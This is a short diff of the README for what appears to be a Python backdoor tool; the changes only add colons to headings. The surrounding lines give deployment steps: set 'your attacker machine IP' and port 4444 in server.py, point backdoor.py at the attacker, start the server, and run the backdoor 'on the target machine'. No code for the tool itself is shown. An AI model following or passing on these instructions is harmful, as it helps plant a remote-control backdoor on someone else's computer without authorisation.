@@ -7,7 +7,7 @@ Instructions:
   
 2. Installer termcolor: pip install termcolor
 
-3. Configure the Server
+3. Configure the Server:
   Open server.py and set:
     IP address: The server’s local or public IP.
     Port: An open TCP port (e.g., 4444).
@@ -15,7 +15,7 @@ Instructions:
         host = "192.168.1.10"  # your attacker machine IP
         port = 4444
 
-4. Configure the Backdoor
+4. Configure the Backdoor:
    In backdoor.py, set:
     The server IP to point to your attacker machine. The port to match the server port.
       Example:
@@ -24,7 +24,7 @@ Instructions:
 
 5. Run the Server: python3 server.py
 
-6. Deploy the Backdoor
+6. Deploy the Backdoor:
    Run backdoor.py on the target machine:
     python3 backdoor.py
 
